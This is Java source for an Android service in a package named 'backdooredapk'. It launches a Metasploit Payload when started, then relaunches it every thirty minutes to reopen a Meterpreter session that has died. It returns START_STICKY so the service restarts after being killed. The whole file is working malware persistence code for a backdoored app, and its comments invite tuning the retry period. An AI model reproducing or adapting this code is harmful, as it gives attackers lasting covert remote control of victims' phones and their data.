package stage.metasploit.com.backdooredapk;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

public class MyIntentService extends Service {

    ScheduledFuture<?> beeperHandle;
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

    public MyIntentService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Payload.start(this);
        periodicallyAttempt(); //modify this method, more than 10 seconds are hard-coded set
        // If we get killed, after returning from here, restart
        return START_STICKY;
    }

    public void periodicallyAttempt(){
        //if meterpreter session dies unexpectedly, the background service will try to reopen it without restarting the app
        //since a new session is started, even if the current session is still alive, i put a very large period (30 min)

        long half_an_hour = (3600)/(2); //time passing between each attempt to open a new meterpreter session

        final Runnable beeper = new Runnable() {

            public void run()
            {
                Payload.start(getApplicationContext());

            }

        };

        beeperHandle = scheduler.scheduleAtFixedRate(beeper, half_an_hour, half_an_hour, TimeUnit.SECONDS);

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
